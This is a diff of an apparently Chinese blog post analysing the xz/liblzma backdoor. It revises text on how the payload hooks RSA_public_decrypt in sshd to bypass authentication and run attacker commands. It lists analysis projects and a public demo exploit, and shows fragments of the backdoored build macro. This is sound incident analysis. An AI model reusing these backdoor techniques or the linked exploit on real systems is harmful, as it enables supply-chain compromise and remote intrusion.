-</span></span><span class="line"><span class="cl">+  <span class="k">else</span>
-</span></span><span class="line"><span class="cl">+    <span class="nv">HAVE_PKG_CONFIGMAKE</span><span class="o">=</span><span class="m">0</span>
-</span></span><span class="line"><span class="cl">+  <span class="k">fi</span>
-</span></span><span class="line"><span class="cl">+
-</span></span><span class="line"><span class="cl">   <span class="nv">gl_sed_double_backslashes</span><span class="o">=</span><span class="s1">&#39;s/\\/\\\\/g&#39;</span>
-</span></span><span class="line"><span class="cl">   <span class="nv">gl_sed_escape_doublequotes</span><span class="o">=</span><span class="s1">&#39;s/&#34;/\\&#34;/g&#39;</span>
-</span></span><span class="line"><span class="cl">+  <span class="nv">gl_path_map</span><span class="o">=</span><span class="s1">&#39;tr &#34;\t \-_&#34; &#34; \t_\-&#34;&#39;</span>
-</span></span><span class="line"><span class="cl"> changequote<span class="o">(</span>,<span class="o">)</span>dnl
-</span></span><span class="line"><span class="cl">   <span class="nv">gl_sed_escape_for_make_1</span><span class="o">=</span><span class="s2">&#34;s,\\([ \&#34;&amp;&#39;();&lt;&gt;\\\\\`|]\\),\\\\\\1,g&#34;</span>
-</span></span><span class="line"><span class="cl"> changequote<span class="o">([</span>,<span class="o">])</span>dnl
-</span></span></code></pre></div><h3 id="payload-有效载荷">payload 有效载荷</h3>
-<p>如果上述后门的这些条件得到满足，有效负载将运行并注入到源代码树中。以下是我所知道的主要内容：</p>
-<ul>
-<li>如果正在运行的程序具有进程名称 <code>/usr/sbin/sshd</code> ，则有效负载将激活。放入 <code>sshd</code> <code>/usr/bin</code> 其他文件夹的系统可能容易受到攻击，也可能不容易受到攻击。</li>
+<li>如果正在运行的程序具有进程名称 <code>/usr/sbin/sshd</code> ，则payload将激活。</li>
 <li>它也可能在其他场景中激活，甚至可能与 ssh 无关。</li>
-<li>我们不知道有效载荷的目的是做什么。我们正在调查。</li>
+<li>暂不清楚有效载荷的目的是做什么，正在调查。</li>
 <li>Vanilla 上游 OpenSSH 不受影响，除非其依赖项链接 <code>liblzma</code> 之一。
 <ul>
 <li>Lennart Poettering 曾提到它可能通过 pam-&gt;libselinux-&gt;liblzma 发生，也可能在其他情况下发生，但是&hellip;&hellip;</li>
@@ -853,16 +847,24 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 <li>PAM 模块在进程 AFAIK 中加载得太晚，无法正常工作（另一个可能的例子是 <code>pam_fprintd</code> ）。Solar Designer 在 oss-security 上也提出了这个问题。</li>
 </ul>
 </li>
-<li>有效负载被间接加载到中 <code>sshd</code> 。 <code>sshd</code> 通常修补以支持 systemd-notify，以便在 SSHD 运行时可以启动其他服务。 <code>liblzma</code> 加载，因为它依赖于 <code>libsystemd</code> 的其他部分。这不是systemd的错，这是更不幸的。大多数发行版使用的补丁都可以在这里找到：openssh/openssh-portable#375。
+<li>payload被间接加载到 <code>sshd</code> 。 <code>sshd</code> 通常被 patch 以支持 systemd-notify，以便在 SSHD 运行时可以启动其他服务。 加载<code>liblzma</code>是因为它被 <code>libsystemd</code> 的其他部分所依赖，这不是systemd的错。大多数发行版使用的补丁都可以在这里找到：openssh/openssh-portable#375。
 <ul>
-<li>更新：OpenSSH开发人员正在考虑添加systemd-notify协议的非库集成，这意味着发行版将不再 <code>libsystemd</code> 支持补丁。</li>
+<li>更新：OpenSSH开发人员正在考虑添加systemd-notify协议的非库集成，这意味着发行版将不再支持 patch <code>libsystemd</code> 。</li>
 </ul>
 </li>
-<li>如果此有效负载加载到 openssh <code>sshd</code> 中，则该 <code>RSA_public_decrypt</code> 函数将被重定向到恶意实现中。我们观察到，这种恶意实现可用于绕过身份验证。正在做进一步的研究来解释原因。
+<li>如果此payload加载到 openssh 的<code>sshd</code> 中，则该 <code>RSA_public_decrypt</code> 函数将被重定向到恶意实现中。这种恶意实现可用于绕过身份验证。
 <ul>
-<li>Filippo Valsorda 共享分析表明，攻击者必须提供一个由有效负载验证的密钥，然后将攻击者的输入传递给 <code>system()</code> ，从而提供远程代码执行 （RCE）。</li>
+<li>Filippo Valsorda 分享的<a href="https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b"target="_blank" rel="external nofollow noopener noreferrer">分析</a>表明，攻击者必须提供一个由payload验证的密钥，然后将攻击者的输入传递给 <code>system()</code> ，从而提供远程代码执行 （RCE）。</li>
 </ul>
 </li>
+</ul>
+<p>关于更多Payload分析，可以关注些大佬们的进度和项目情况：</p>
+<ul>
+<li>Filippo Valsorda 的分析线程：https://bsky.app/profile/did:plc:x2nsupeeo52oznrmplwapppl/post/3kowjkx2njy2b</li>
+<li>通过 @smx-smx （WIP） 进行 XZ 后门分析：https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504</li>
+<li>modify_ssh_rsa_pubkey.py by @keeganyan - 脚本来触发受感染 <code>sshd</code> 的有效负载的更多部分</li>
+<li>xz-恶意软件https://github.com/karcherm/xz-malware</li>
+<li>xz-后门https://github.com/hamarituc/xz-backdoor</li>
 </ul>
 <h3 id="xz-bits">xz bits</h3>
 <ul>
@@ -887,19 +889,8 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 <p>分析人员Lasse 目前在这一切开始之前就开始了人员分析。他在 <a href="https://tukaani.org/xz-backdoor/"target="_blank" rel="external nofollow noopener noreferrer">https://tukaani.org/xz-backdoor/</a> 上发布了更新，并正在与社区合作进行一步分析处理。请耐心等待他，因为他会加快速度并花时间仔细分析情况。</p>
 <p>本次事件的主角是Jia Tan （JiaT75），根据他的名字，他希望人们相信他是亚洲人，特并且他的绝大多数提交都是 UTC+08 时间戳。 然而，我更相信他实际上来自 UTC+02/UTC+03时区的某个地方，其中包括东欧（EET）、以色列（IST）等。他通常早上 9 点到下午 6 点工作（根据 EET 调整）。这比在周二晚上午夜和凌晨 1 点工作的人更合理（使用 UTC+08）。</p>
 <p>关于这些，详情可见：https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and</p>
-<h3 id="payload分析">payload分析</h3>
-<p>因为还在分析阶段，而且逆向分析部分才刚刚开始，结果会不断变化，可以关注些大佬们的进度和项目情况：</p>
-<ul>
-<li>xz/liblzma：由 @gynvael 解释的混淆部详解https://gynvael.coldwind.pl/?lang=en&amp;id=782</li>
-<li>菲利波·瓦尔索达（Filippo Valsorda）的分析线程https://bsky.app/profile/did:plc:x2nsupeeo52oznrmplwapppl/post/3kowjkx2njy2b</li>
-<li>通过 @smx-smx （WIP） 进行 XZ 后门分析https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504</li>
-<li>XZ 后门文档 Wiki 由 @Midar et 提供。铝https://github.com/Midar/xz-backdoor-documentation/wiki</li>
-<li>modify_ssh_rsa_pubkey.py by @keeganryan - 脚本来触发受感染 <code>sshd</code> 的有效负载的更多部分</li>
-<li>xz-恶意软件https://github.com/karcherm/xz-malware</li>
-<li>xz-后门https://github.com/hamarituc/xz-backdoor</li>
-</ul>
 <h2 id="漏洞利用">漏洞利用</h2>
-<p>github已有公开的demo exp <a href="https://github.com/amlweems/xzbot"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/amlweems/xzbot</a>，这个exp通过patch后门中的公钥为自己的私钥来验证漏洞的存在。</p>
+<p>github已有公开的<a href="https://github.com/amlweems/xzbot"target="_blank" rel="external nofollow noopener noreferrer">demo exp</a>，这个exp通过patch后门中的公钥为自己的私钥来验证漏洞的存在。</p>
 <p>见 <a href="https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg"target="_blank" rel="external nofollow noopener noreferrer">https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg</a> 已有复现</p>
 <blockquote>
 <p>下载了debian官方编译的deb包。安装之后使用patch.py脚本手动patch。</p>
@@ -928,6 +919,7 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 <li>xzre：https://github.com/smx-smx/xzre</li>
 <li>XZ Backdoor: Times, damned times, and scams：https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and</li>
 <li>XZ开源项目投毒事件深入解析：https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg</li>
+<li><a href="https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b"target="_blank" rel="external nofollow noopener noreferrer">https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b</a></li>
 </ul></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
